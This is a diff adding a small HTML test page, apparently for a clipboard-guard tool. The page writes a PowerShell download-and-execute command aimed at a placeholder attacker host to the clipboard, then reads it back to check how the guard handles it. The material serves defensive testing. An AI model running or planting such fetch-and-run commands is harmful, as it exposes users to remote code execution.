@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8"><title>Read-back via read()</title>
+<script src="common.js"></script></head>
+<body><h1>Read-back via read()</h1>
+<button id="go">Check</button>
+<script>
+document.getElementById("go").addEventListener("click", async () => {
+  await window.__clipguard.writeText("irm https://evil.invalid/rd | iex");
+  try {
+    const items = await navigator.clipboard.read();
+    let text = "";
+    for (const it of items) {
+      if (it.types.includes("text/plain")) {
+        text = await (await it.getType("text/plain")).text();
+      }
+    }
+    window.__clipguardResult.read = text;
+  } catch (e) {
+    window.__clipguardResult.read = "<error: " + e + ">";
+  }
+});
+</script>
+</body></html>
